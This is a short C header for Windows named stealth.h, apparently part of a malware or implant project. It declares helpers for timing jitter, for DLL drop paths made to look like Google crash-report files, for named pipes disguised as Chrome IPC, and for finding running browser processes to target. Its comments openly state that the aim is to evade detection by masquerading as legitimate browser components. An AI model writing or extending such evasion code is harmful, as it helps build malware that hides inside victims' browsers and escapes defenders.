#ifndef STEALTH_H
#define STEALTH_H

#include <windows.h>

// Random delay between min_ms and max_ms
void jitter_sleep(DWORD min_ms, DWORD max_ms);

// Generate a DLL drop path that looks legit
// e.g. %LOCALAPPDATA%\Google\CrashReports\crupd_<rand>.dll
void generate_drop_path(char* out_path, DWORD max_len, const char* browser_subdir);

// Generate a pipe name that blends in with Chrome IPC
// e.g. \\.\pipe\chrome.sync.12345.0.1
void generate_pipe_name(char* out_name, DWORD max_len, DWORD pid);

// Find a running browser process by exe name, return its PID (0 if not found)
DWORD find_process_pid(const char* exe_name);

#endif
